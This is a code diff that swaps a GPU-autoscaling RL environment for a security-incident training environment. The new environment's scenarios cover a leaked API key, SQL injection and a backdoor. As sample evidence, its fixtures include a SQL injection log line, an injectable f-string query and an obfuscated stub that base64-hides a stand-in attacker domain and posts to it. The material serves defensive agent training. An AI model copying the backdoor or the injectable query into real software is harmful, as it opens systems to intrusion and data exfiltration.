@@ -1,357 +1,237 @@
-"""
-environment.py — LLM Serving Autoscaler RL Environment (OpenEnv-compatible).
-
-Implements LLMServeEnv with:
-  - reset(task)  : initialise episode for easy / medium / hard
-  - step(action) : advance one timestep, return (obs, reward, done, info)
-  - state()      : return current observation without advancing
-"""
-
-import math
-import numpy as np  # type: ignore
-import os
 import sys
-# Ensure the root directory is on the path for local imports
-_root = os.path.dirname(os.path.abspath(__file__))
-if _root not in sys.path:
-    sys.path.insert(0, _root)
+import os
+import numpy as np
+import base64
+import random
+from typing import Dict, Any, Tuple, Optional, List
+from models import IncidentAction, IncidentObs
 
-from models import LLMServeObs, LLMServeAction  # type: ignore # noqa: E402
+# --- ENVIRONMENT ---
 
-# ---------------------------------------------------------------------------
-# Constants
-# ---------------------------------------------------------------------------
-
-EPISODE_LENGTH   = 1000
-MAX_GPUS         = 100
-MAX_QUEUE        = 20000        # hard spike needs room to build up
-MAX_LATENCY      = 500.0        # ms — used for reward/grader normalisation
-MIN_GPUS         = 1            # always keep at least one GPU running
-
-
-# ---------------------------------------------------------------------------
-# Traffic generators (deterministic via seeded RNG)
-# ---------------------------------------------------------------------------
-
-def _traffic_easy(step: int, rng: np.random.Generator) -> float:
-    """
-    Stable 150 req/s — always comfortably below 4-GPU capacity (256).
-    Agent barely needs to scale. Queue stays near zero.
-    """
-    return float(np.clip(150.0 + rng.normal(0, 8.0), 80, 220))
-
-
-def _traffic_medium(step: int, rng: np.random.Generator) -> float:
-    """
-    Sinusoidal 100–2000 req/s — peaks exceed initial capacity,
-    agent must scale aggressively, queue builds transiently.
-    """
-    base = 1050.0 + 950.0 * math.sin(2 * math.pi * step / 200)
-    return float(np.clip(base + rng.normal(0, 40.0), 80, 2200))
-
-
-def _traffic_hard(step: int, rng: np.random.Generator) -> float:
-    """
-    Stable → massive spike (200–500) at 15000 req/s (exceeds max GPU
-    capacity of 12800) → slow elevated cooldown (6000→200).
-    Queue is irrecoverable during spike even at 100 GPUs.
-    """
-    if step < 200:
-        base = 150.0                                      # same as easy
-    elif step < 500:
-        base = 20000.0 + rng.normal(0, 300.0)            # 20K rps - exceeds max capacity
-    else:
-        # cooldown stays well above easy-level for 500 steps
-        progress = (step - 500) / 500
-        base = 6000.0 - 5800.0 * progress                # 6000 → 200
-    return float(np.clip(base + rng.normal(0, 15.0), 80, 21000))
-
-
-_TRAFFIC_FN = {
-    "easy":   _traffic_easy,
-    "medium": _traffic_medium,
-    "hard":   _traffic_hard,
+TASK_MAP = {
+    "easy": "leak-investigation",
+    "medium": "sqli-detection",
+    "hard": "backdoor-hunt"
 }
 
-
-# ---------------------------------------------------------------------------
-# OpenEnv base class (lightweight stub — no external dependency)
-# ---------------------------------------------------------------------------
-
-class OpenEnv:
-    """Minimal OpenEnv interface contract."""
-
-    def reset(self, task: str):
-        raise NotImplementedError
-
-    def step(self, action):
-        raise NotImplementedError
-
-    def state(self):
-        raise NotImplementedError
-
-
-# ---------------------------------------------------------------------------
-# Main Environment
-# ---------------------------------------------------------------------------
-
-class LLMServeEnv(OpenEnv):
-    """
-    LLM Serving Autoscaler Environment.
-
-    Episode length : 1000 steps
-    Tasks          : easy | medium | hard
-    Seed           : 42 (deterministic)
-    """
-
+class SentinelSOCEnv:
     def __init__(self):
-        self._rng: np.random.Generator = None  # type: ignore
-        self._task: str = "easy"
-        self._step_count: int = 0
+        self.task = "leak-investigation" # default
+        self.max_steps = 10
+        self.reset()
 
-        # Mutable state
-        self._active_gpus: int = 4
-        self._queue_length: int = 0
-        self._incoming_rate: float = 0.0
-        self._avg_latency: float = 0.0
-        self._batch_size: int = 64
-        self._cache_load: float = 0.1
-        self._spot_gpu_ratio: float = 0.0
+    def reset(self, task: str = "easy") -> IncidentObs:
+        internal = TASK_MAP.get(task, task)
+        self.task = internal
+        self.max_steps = {
+            "leak-investigation": 10,
+            "sqli-detection": 15,
+            "backdoor-hunt": 20
+        }.get(internal, 10)
 
-        # Episode-level accumulators (used by grader)
-        self._total_service_ratio: float = 0.0  # served / incoming each step
-        self._total_latency: float = 0.0
-        self._total_cost: float = 0.0
-        self._steps_done: int = 0
+        self.steps_taken = 0
+        self.status = "Active"
+        self.found_file = False
+        self.found_ioc = False
+        self.mitigated = False
+        self.has_queried = False
+        self.last_tool = None
+        self.reward_total = 0.0
+        self.history = [] # For UI visualization
+        self._init_scenario()
+        return self._get_obs()
 
-    # ------------------------------------------------------------------
-    # OpenEnv API
-    # ------------------------------------------------------------------
+    def _init_scenario(self):
+        # NOTE: [HINT FOR ANALYST] 
+        # Production keys start with 'sk_live'. 
+        # Test keys start with 'sk_test' and are NOT critical.
+        
+        if self.task == "leak-investigation":
+            self.target_file = "app.log"
+            self.decoy_file = "config.py"
+            self.target_ioc = "sk_live_51M0x2L9ABcdEF67890"
+            self.decoy_ioc = "sk_test_dev_fake_key_999"
+            
+            self.incident_thread = (
+                "[ALERT] Automated scanner detected 'sk_live' pattern in production logs!"
+            )
+            # Explicitly naming the log file in the log lines to guide the agent
+            self.logs = (
+                "2024-04-11 12:01:01 INFO [system]: System Heartbeat OK\n"
+                "2024-04-11 12:01:45 DEBUG [app.log]: [DECOY] Initializing Test Suite with sk_test_dev_fake_key_999\n"
+                "2024-04-11 12:01:46 CRITICAL [app.log]: [LEAK] Production client initialized with: sk_live_51M0x2L9ABcdEF67890\n"
+                "2024-04-11 12:02:00 WARNING [config.py]: recent modification by 'dev_user'"
+            )
+            self.code_snippet = "# config.py\nDEBUG = True\n# TODO: Move keys to env vars"
+        
+        elif self.task == "sqli-detection":
+            self.target_file = "db_utils.py"
+            self.decoy_file = "db_backup.log"
+            self.target_ioc = "192.168.1.137"
+            self.decoy_ioc = "10.0.0.5"
+            
+            self.incident_thread = "[ALERT] Unusual database query volume detected from 192.168.1.137."
+            self.logs = (
+                "10.0.0.5 - - [11/Apr/2024:12:00:01] 'GET /health HTTP/1.1' 200\n"
+                "192.168.1.137 - - [11/Apr/2024:12:05:01] 'GET /user?id=1' UNION SELECT credit_card FROM users -- HTTP/1.1' 200"
+            )
+            self.code_snippet = "def get_user(id):\n    # POTENTIALLY VULNERABLE\n    return db.execute(f'SELECT * FROM users WHERE id={id}')"
 
-    def reset(self, task: str = "easy") -> LLMServeObs:
-        """Reset the environment for a new episode."""
-        if task not in _TRAFFIC_FN:
-            raise ValueError(f"Unknown task '{task}'. Choose from: easy, medium, hard.")
+        elif self.task == "backdoor-hunt":
+            self.target_file = "vendor/auth_lib.py"
+            self.decoy_file = "auth_config.json"
+            self.target_ioc = "attacker-domain.cc"
+            self.decoy_ioc = "meta-auth.com"
+            
+            self.incident_thread = "[CRITICAL] Unauthorized egress detected to unknown endpoint."
+            self.logs = (
+                "NETWORK: 172.16.0.5 -> meta-auth.com:443 (Authorized)\n"
+                "NETWORK: 172.16.0.5 -> attacker-domain.cc:443 (UNAUTHORIZED)"
+            )
+            encoded_val = base64.b64encode(b"attacker-domain.cc").decode()
+            self.code_snippet = f"""
+# vendor/auth_lib.py
+import base64
+def sync():
+    target = base64.b64decode("{encoded_val}").decode()
+    requests.post(f'https://{{target}}/ping')
+"""
 
-        self._task       = task
-        self._rng        = np.random.default_rng(42)
-        self._step_count = 0
-
-        # Initial conditions
-        self._active_gpus     = 4
-        self._queue_length    = 0
-        self._incoming_rate   = 20.0
-        self._avg_latency     = 50.0
-        self._batch_size      = 64
-        self._cache_load      = 0.1
-        self._spot_gpu_ratio  = 0.0
-
-        # Accumulators
-        self._total_service_ratio = 0.0
-        self._total_latency       = 0.0
-        self._total_cost          = 0.0
-        self._steps_done          = 0
-
-        return self.state()
-
-    def step(self, action: LLMServeAction) -> tuple:
-        """
-        Advance one timestep.
-
-        Returns:
-            (obs, reward, done, info)
-        """
-        if self._rng is None:
-            raise RuntimeError("Call reset() before step().")
-
-        # --- 1. Apply action (with robust clipping for safety/exploits) ---
-        new_gpus = int(np.clip(
-            self._active_gpus + action.scale,
-            MIN_GPUS, MAX_GPUS
-        ))
-        self._active_gpus    = new_gpus
-        self._batch_size     = int(np.clip(action.batch_size, 32, 128))
-        self._spot_gpu_ratio = float(np.clip(action.spot_allocation, 0.0, 1.0))
-
-        # --- 1b. Spot GPU preemption (safe, deterministic) ---
-        # Cloud provider may reclaim spot instances under load.
-        # Only affects medium/hard tasks; uses seeded RNG for reproducibility.
-        _preempted = 0
-        if self._spot_gpu_ratio > 0 and self._task != "easy":
-            if self._rng.random() < 0.03:  # ~3 % chance per step
-                lost = max(1, int(self._active_gpus * 0.05))
-                lost = min(lost, 2)          # cap at 2 GPUs
-                self._active_gpus = max(MIN_GPUS, self._active_gpus - lost)
-                _preempted = lost
-
-        # --- 2. Generate incoming traffic ---
-        traffic_fn          = _TRAFFIC_FN[self._task]
-        self._incoming_rate = traffic_fn(self._step_count, self._rng)
-
-        # --- 3. Compute capacity and throughput ---
-        # Each GPU can handle batch_size requests per step; scale linearly
-        capacity          = self._active_gpus * self._batch_size
-        served            = float(min(capacity, self._queue_length + self._incoming_rate))
-        throughput        = served
-
-        # --- 4. Update queue ---
-        arrived            = self._incoming_rate
-        self._queue_length = int(np.clip(
-            self._queue_length + arrived - served,
-            0, MAX_QUEUE * 2          # allow slight overflow for penalty
-        ))
-
-        # --- 5. Compute average latency (ms) ---
-        # Base latency grows with queue depth, shrinks with more capacity
-        queue_pressure     = self._queue_length / max(capacity, 1)
-        self._avg_latency  = float(np.clip(
-            20.0 + queue_pressure * 400.0 + self._rng.normal(0, 2.0),
-            0.0, 2000.0
-        ))
-
-        # --- 6. Compute cost (normalised 0–1) ---
-        # Spot GPUs are cheaper (0.3× cost); regular GPUs = 1.0×
-        spot_gpus    = self._active_gpus * self._spot_gpu_ratio
-        regular_gpus = self._active_gpus - spot_gpus
-        gpu_cost     = (regular_gpus * 1.0 + spot_gpus * 0.3) / MAX_GPUS
-
-        # --- 7. Update cache load ---
-        # Cache fills with high queue, drains when serving catches up
-        cache_delta       = 0.05 if self._queue_length > 50 else -0.02
-        self._cache_load  = float(np.clip(self._cache_load + cache_delta, 0.0, 1.0))
-
-        # --- 8. Accumulate episode stats ---
-        # Service ratio: fraction of incoming requests actually served (0–1)
-        service_ratio = float(np.clip(
-            served / max(self._incoming_rate, 1.0), 0.0, 1.0
-        ))
-        self._total_service_ratio += service_ratio
-        self._total_latency       += self._avg_latency
-        self._total_cost          += gpu_cost
-        self._steps_done          += 1
-
-        # --- 9. Compute reward ---
-        latency_score    = 1.0 - min(self._avg_latency / MAX_LATENCY, 1.0)
-        throughput_score = float(np.clip(service_ratio, 0.0, 1.0))
-        gpu_penalty      = self._active_gpus / MAX_GPUS
-        queue_penalty    = min(self._queue_length / MAX_QUEUE, 1.0)
-        batch_penalty    = self._batch_size / 128.0
-
-        # Stronger queue penalty and latency focus to keep baseline scores grounded
-        reward = (
-              0.6 * latency_score        # increased from 0.5
-            + 0.2 * throughput_score     # reduced from 0.3
-            - 0.15 * gpu_penalty         # kept same
-            - 0.30 * queue_penalty       # increased penalty from 0.25
-            - 0.05 * batch_penalty       # lightly penalise large batch usage
-        )
-        reward = float(np.clip(reward, -1.0, 1.0))
-
-        # --- 10. Advance step counter ---
-        self._step_count += 1
-        done = self._step_count >= EPISODE_LENGTH
-
-        # Detect incidents for "Incident Report" logging
-        incidents = []
-        if self._avg_latency > 200:
-            incidents.append("SLA_VIOLATION_LATENCY")
-        if self._queue_length > MAX_QUEUE:
-            incidents.append("QUEUE_OVERFLOW")
-        if _preempted > 0:
-            incidents.append("SPOT_PREEMPTION_EVENT")
-
-        info = {
-            "step":            self._step_count,
-            "throughput":      throughput,
-            "gpu_cost":        gpu_cost,
-            "capacity":        capacity,
-            "task":            self._task,
-            "preempted_gpus":  _preempted,
-            "incidents":       incidents,
-        }
-
-        return self.state(), reward, done, info
-
-    def state(self) -> LLMServeObs:
-        """Return the current observation without advancing the episode."""
-        return LLMServeObs(
-            active_gpus      = self._active_gpus,
-            queue_length     = self._queue_length,
-            incoming_rate    = self._incoming_rate,
-            avg_latency      = self._avg_latency,
-            batch_size       = self._batch_size,
-            cache_load       = self._cache_load,
-            spot_gpu_ratio   = self._spot_gpu_ratio,
-        )
-
-    # ------------------------------------------------------------------
-    # Helpers (used by grader)
-    # ------------------------------------------------------------------
-
-    def episode_stats(self) -> dict:
-        """Aggregate stats for the completed episode."""
-        n = max(self._steps_done, 1)
-        return {
-            "mean_latency":        self._total_latency        / n,
-            "mean_service_ratio":  self._total_service_ratio  / n,  # 0–1, 1=perfect
-            "mean_cost":           self._total_cost           / n,
-            "steps":               self._steps_done,
-            "task":                self._task,
-        }
-
-    # ------------------------------------------------------------------
-    # Visualisation
-    # ------------------------------------------------------------------
-
-    def render(self, reward: float = 0.0) -> str:
-        """
-        Return a compact ASCII dashboard of the current environment state.
-
-        Parameters
-        ----------
-        reward : float
-            The reward from the most recent step (environment does not
-            store it, so the caller passes it in).
-
-        Returns
-        -------
-        str
-            Multi-line dashboard string (also printed to stdout).
-        """
-        # --- queue bar (30-char max) ---
-        q_frac   = min(self._queue_length / MAX_QUEUE, 1.0)
-        q_filled = int(q_frac * 30)
-        q_bar    = "#" * q_filled + "-" * (30 - q_filled)
-
-        # --- GPU utilisation bar (20-char max) ---
-        g_frac   = self._active_gpus / MAX_GPUS
-        g_filled = int(g_frac * 20)
-        g_bar    = "#" * g_filled + "-" * (20 - g_filled)
-
-        # --- latency indicator ---
-        if self._avg_latency < 50:
-            lat_icon = "GOOD"
-        elif self._avg_latency < 200:
-            lat_icon = "WARN"
+    def _get_obs(self) -> IncidentObs:
+        # Build explicit next-step guidance
+        if not self.has_queried:
+            guidance = "NEXT STEP: Call query_logs to begin investigation."
+        elif not self.found_ioc and not self.found_file:
+            guidance = "NEXT STEP: Call extract_ioc with the suspicious indicator found in logs, OR call inspect_file with a suspicious filename."
+        elif self.found_ioc and not self.found_file:
+            guidance = "IOC CONFIRMED. NEXT STEP: Call inspect_file to identify the root cause file."
+        elif self.found_file and not self.found_ioc:
+            guidance = "FILE IDENTIFIED. NEXT STEP: Call extract_ioc to confirm the indicator of compromise."
+        elif self.found_file and self.found_ioc:
+            guidance = "BOTH IOC AND FILE CONFIRMED. NEXT STEP: Call apply_fix to resolve the incident."
         else:
-            lat_icon = "CRIT"
+            guidance = "Investigation complete."
 
-        # --- ASCII box-drawing characters (safe for all systems) ---
-        H  = "-" * 52
-        TL, TR, ML, MR, BL, BR, V = "+", "+", "+", "+", "+", "+", "|"
+        return IncidentObs(
+            logs=self.logs,
+            code_snippet=self.code_snippet,
+            incident_thread=self.incident_thread + f"\n\n[ANALYST SYSTEM]: {guidance}",
+            status=self.status,
+            steps_remaining=self.max_steps - self.steps_taken,
+            reward_signal=float(round(self.reward_total, 2))
+        )
 
-        lines = [
-            f"{TL}{H}{TR}",
-            f"{V}  Step: {self._step_count:<6d} {V} Task: {self._task:<8s} {V} Reward: {reward:+.4f}  {V}",
-            f"{ML}{H}{MR}",
-            f"{V}  GPUs:  [{g_bar}]  {self._active_gpus:>3d}/{MAX_GPUS}        {V}",
-            f"{V}  Spot:  {self._spot_gpu_ratio:.0%}                                       {V}",
-            f"{V}  Queue: [{q_bar}]  {self._queue_length:>6d}  {V}",
-            f"{V}  Rate:  {self._incoming_rate:>10.1f} req/s                    {V}",
-            f"{V}  Lat:   {self._avg_latency:>8.1f} ms  {lat_icon}                      {V}",
-            f"{V}  Cache: {self._cache_load:.0%}   Batch: {self._batch_size}                     {V}",
-            f"{BL}{H}{BR}",
-        ]
-        dashboard = "\n".join(lines)
-        print(dashboard)
-        return dashboard
+    def step(self, action: IncidentAction) -> Tuple[IncidentObs, float, bool, Dict]:
+        self.steps_taken += 1
+        reward = 0.0
+        done = False
+        tool = action.tool.lower()
+        params = action.parameters.lower().strip()
+        
+        # --- REPEAT PENALTY ---
+        if tool == self.last_tool:
+            reward -= 0.05
+        self.last_tool = tool
+        
+        if tool == "query_logs":
+            if self.has_queried:
+                reward = -0.05  # penalty for repeating query_logs
+                tool_result = "WARNING: Logs already analyzed. No new information. Proceed to extract_ioc or inspect_file."
+                feedback = "✖ Redundant Reconnaissance"
+            else:
+                self.has_queried = True
+                reward = 0.1
+                if self.task == "leak-investigation":
+                    tool_result = f"Logs analyzed. Found suspicious pattern: sk_live key in app.log. Recommend: extract_ioc with 'sk_live_51M0x2L9ABcdEF67890' and inspect_file with 'app.log'"
+                elif self.task == "sqli-detection":
+                    tool_result = f"Logs analyzed. Found SQL injection attempt from IP 192.168.1.137 targeting db_utils.py. Recommend: extract_ioc with '192.168.1.137' and inspect_file with 'db_utils.py'"
+                elif self.task == "backdoor-hunt":
+                    tool_result = f"Logs analyzed. Found unauthorized egress to attacker-domain.cc originating from vendor/auth_lib.py. Recommend: extract_ioc with 'attacker-domain.cc' and inspect_file with 'vendor/auth_lib.py'"
+                else:
+                    tool_result = f"Logs returned for query: {params}"
+                
+                feedback = "Initial investigative reconnaissance initiated"
+            
+        elif tool == "extract_ioc":
+            if not self.has_queried:
+                reward = -0.15
+                tool_result = "REJECTED: Must investigate logs for clues before extraction."
+            elif self.found_ioc:
+                reward = -0.05
+                tool_result = "INFO: Indicator of Compromise already confirmed. Do not repeat."
+            elif params == self.decoy_ioc.lower():
+                reward = -0.2
+                tool_result = f"WARNING: {params} is a known SAFE or DECOY indicator. Do not escalate."
+            elif self.target_ioc.lower() in params:
+                self.found_ioc = True
+                reward = 0.3
+                tool_result = f"SUCCESS: IOC {self.target_ioc} confirmed! NEXT STEP: Identify the root cause file using 'inspect_file' and then 'apply_fix'."
+                feedback = "High-confidence indicator of compromise detected"
+            else:
+                reward = -0.05
+                tool_result = f"FAILURE: Indicator {params} not confirmed in dataset."
+                feedback = "Potential false positive: Signal not verified"
+
+        elif tool == "inspect_file":
+            if params == self.decoy_file.lower():
+                reward = -0.05
+                tool_result = f"RED HERRING: {params} shows suspicious activity but is not the root cause."
+            elif params == self.target_file.lower():
+                self.found_file = True
+                reward = 0.2
+                tool_result = f"CRITICAL: Resource {self.target_file} identified as exploit source. NEXT STEP: If IOC is also confirmed, call 'apply_fix' to close the incident."
+                feedback = "✔ Root Cause File Identified"
+            else:
+                reward = -0.05
+                tool_result = f"INFO: No proof of compromise in {params}."
+                feedback = "✖ No Malicious Artifacts"
+
+        elif tool == "apply_fix":
+            if self.found_file and self.found_ioc:
+                self.mitigated = True
+                self.status = "Mitigation Active"
+                reward = 0.4
+                tool_result = "SUCCESS: Incident mitigated. Monitoring for recurrence."
+                feedback = "Mitigation applied — monitoring for recurrence"
+                done = True
+            else:
+                reward = -0.15
+                tool_result = "REJECTED: Cannot fix. Requires verified File and IOC first."
+                feedback = "✖ Premature Mitigation Attempt"
+        
+        else:
+            reward = -0.1
+            tool_result = f"Invalid tool: {tool}"
+
+        self.reward_total += reward
+        
+        # Log to history for the Forensic Dashboard
+        conf = round(0.90 if reward > 0 else 0.25, 2)
+        self.history.append({
+            "step": self.steps_taken,
+            "reasoning": action.reasoning,
+            "tool": tool,
+            "params": params,
+            "reward": round(float(reward), 2),
+            "cumulative": round(float(self.reward_total), 2),
+            "status": "SUCCESS" if reward > 0 else "REJECTED" if reward < 0 else "INFO",
+            "feedback": locals().get('feedback', "Investigation update"),
+            "confidence": conf
+        })
+
+        if self.steps_taken >= self.max_steps:
+            done = True
+            
+        return self._get_obs(), reward, done, {"tool_result": tool_result}
+
+    def grade(self) -> float:
+        base_score = 0.01
+        if self.has_queried: base_score += 0.1
+        if self.found_ioc: base_score += 0.3
+        if self.found_file: base_score += 0.2
+        if self.mitigated: base_score += 0.38
+        
+        # Efficiency scaling (15% impact from steps)
+        penalty = (self.steps_taken / self.max_steps) * 0.15
+        final_score = base_score - penalty
+        return float(round(np.clip(final_score, 0.01, 0.99), 3))
